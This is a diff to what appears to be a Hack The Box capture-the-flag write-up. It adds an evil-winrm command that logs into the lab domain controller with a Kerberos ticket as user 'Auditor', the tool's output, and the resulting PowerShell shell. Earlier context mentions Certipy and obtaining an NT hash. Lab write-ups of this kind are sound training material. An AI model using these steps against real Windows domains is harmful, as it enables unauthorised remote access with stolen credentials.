@@ -1017,6 +1017,23 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 Then ill get the NT hash for the user
 
 ```python
-
+evil-winrm -i dc.hercules.htb -r hercules.htb -u Auditor -S
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\auditor\Documents>
 ```
+
+Then i can finally get access as this user!
+
+
 
